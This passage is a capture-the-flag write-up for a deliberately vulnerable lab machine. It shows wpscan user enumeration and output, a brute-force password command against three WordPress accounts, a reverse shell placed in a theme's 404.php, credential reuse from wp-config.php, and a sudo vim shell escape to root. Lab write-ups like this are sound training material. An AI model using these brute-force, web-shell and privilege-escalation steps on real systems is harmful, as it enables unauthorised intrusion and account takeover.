scanned in -19765.28 seconds\n</code></pre></li> </ul>"},{"location":"easy/colddbox/#enumeration","title":"Enumeration","text":"<p>The first step in this process was to enumerate the webserver (WordPress) with its vulnerable plugins, themes, and users using wpscan. </p> <p>User Enumeration</p> <p><p><code>wpscan --url http://$IP -e  u</code></p></p> <p>After running this command, it returned c0ldd, philip, and hugo as usernames.</p> <pre><code>[+] URL: http://10.10.237.179/ [10.10.237.179]\n[+] Started: Mon Feb 20 13:13:31 2023\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)\n| Found By: Headers (Passive Detection)\n| Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.237.179/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n| Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.237.179/readme.html\n | Found By: Direct Access (Aggressive Detection)\n| Confidence: 100%\n\n[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).\n | Found By: Rss Generator (Passive Detection)\n|  - http://10.10.237.179/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.1.31&lt;/generator&gt;\n |  - http://10.10.237.179/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.1.31&lt;/generator&gt;\n\n[+] WordPress theme in use: twentyfifteen\n | Location: http://10.10.237.179/wp-content/themes/twentyfifteen/\n | Last Updated: 2022-11-02T00:00:00.000Z\n | Readme: http://10.10.237.179/wp-content/themes/twentyfifteen/readme.txt\n | [!] The version is out of date, the latest version is 3.3\n | Style URL: http://10.10.237.179/wp-content/themes/twentyfifteen/style.css?ver=4.1.31\n | Style Name: Twenty Fifteen\n | Style URI: https://wordpress.org/themes/twentyfifteen\n | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen simple, st...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\nBrute Forcing Author IDs - Time: 00:00:01 &lt;========================================&gt; (10 / 10) 100.00% Time: 00:00:01\n\n[i] User(s) Identified:\n\n[+] the cold in person\n | Found By: Rss Generator (Passive Detection)\n\n[+] hugo\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n| Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] c0ldd\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n| Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] philip\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n| Confirmed By: Login Error Messages (Aggressive Detection)\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n</code></pre> <p>I decided to brute force the usernames and passwords using wpscan's built-in feature.</p> <p>Brute Force</p> <p><p><code>wpscan --url $IP -U 'c0ldd,hugo,philip' -P /usr/share/seclists/Passwords/probable-v2-top12000.txt</code></p></p> <pre><code>[+] Enumerating Config Backups (via Passive and Aggressive Methods)\nChecking Config Backups - Time: 00:00:04 &lt;=======================================&gt; (137 / 137) 100.00% Time: 00:00:04\n\n[i] No Config Backups Found.\n\n[+] Performing password attack on Wp Login against 3 user/s\n[SUCCESS] - c0ldd / REDACTED                                                                                        ^Cying philip / beanie Time: 00:09:52 &lt;========                                 &gt; (8839 / 40665) 21.73%  ETA: 00:35:35\n[!] Valid Combinations Found:\n | Username: c0ldd, Password: REDACTED\n[!] No WPScan API Token given, as a result vulnerability data has not been output.(8844 / 40665) 21.74%  ETA: 00:35:34\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Mon Feb 20 13:32:05 2023\n[+] Requests Done: 8984\n[+] Cached Requests: 38\n[+] Data Sent: 2.909 MB\n[+] Data Received: 32.484 MB\n[+] Memory used: 304.16 MB\n[+] Elapsed time: 00:09:59\n</code></pre>"},{"location":"easy/colddbox/#initial-access","title":"Initial Access","text":"<p>Quickly, I directed to <code>/wp-login.php</code> to verify login with the harvested credentials -- c0ld:REDACTED</p> <p></p> <p>After successfully logging in using the credentials for <code>c0ldd</code>, I edited the 404.php file in the appearance tab of the themes section to add a reverse shell. This allowed me to get my initial foothold into the web server. </p> <p></p> <p>I opened a listener on another tab and then opened the 404.php file in my browser. As a result, I gained access to the server with the <code>www-data</code> privilege.</p> <p> </p>"},{"location":"easy/colddbox/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"easy/colddbox/#gaining-user-access","title":"Gaining User access","text":"<p>As www-data, I didn't initially have access to any juicy information. However, I was able to run linpeas.sh, which helped me to find some credentials that were left in the wp-config.php file. </p> <p></p> <p>I copied the username and password and attempted to access the <code>3306</code> port that was running on <code>127.0.0.1</code> but had no luck. Finally, I tried using the same credentials to log in to the <code>c0ldd</code> account. This was a success, and I was able to escalate my privilege from <code>www-data</code> to <code>c0ldd</code>.</p>"},{"location":"easy/colddbox/#gaining-root-access","title":"Gaining Root access","text":"<p>As <code>c0ldd</code>, I ran sudo -l as I already knew his password. The output showed that Vim could be run as sudo.</p> <p></p> <p>With this knowledge, I was able to execute the command </p> <p>Sudo Command</p> <p><p><code>sudo vim -c ':!/bin/sh'</code></p></p> <p>from GTFOBINS. This allowed me to edit a file that was owned by root, thereby giving me access to the root user. As a result, I was able to escalate my privilege once again and become root.</p>"}]}